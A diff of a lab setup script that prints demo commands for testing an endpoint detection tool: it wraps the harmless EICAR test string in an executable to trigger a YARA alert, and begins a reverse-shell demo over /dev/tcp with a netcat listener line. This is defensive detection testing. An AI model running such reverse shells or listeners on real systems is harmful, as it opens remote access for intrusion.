@@ -264,10 +264,12 @@ fi
 # ---- 6. Print the three demo commands ---------------------------------------
 say "Activity 5 demos (run these to test the tool)"
 cat <<EOF
-  1) EICAR test file (download + execute so the scan-on-process-start fires):
+  1) EICAR test file. Rustinel scans on process-start, and the raw EICAR file is
+     not a Linux executable, so wrap the signature in a runnable ELF and run THAT:
        wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt
-       chmod +x ~/eicar.com && ~/eicar.com 2>/dev/null; echo done
-     -> expect an EICAR IOC/YARA alert in $ALERTDIR/alerts.json*
+       cp /bin/true ~/eicar_run; cat ~/eicar.com >> ~/eicar_run; chmod +x ~/eicar_run; ~/eicar_run
+     -> the process image carries the EICAR signature -> EICAR YARA rule fires
+        (alert in $ALERTDIR/alerts.json*). Clean up: rm -f ~/eicar.com ~/eicar_run
 
   2) Network intrusion — reverse shell via /dev/tcp (fires the bundled Sigma rule):
        # optional listener on a reachable lab host, e.g. on igw:  nc -lvnp 4444
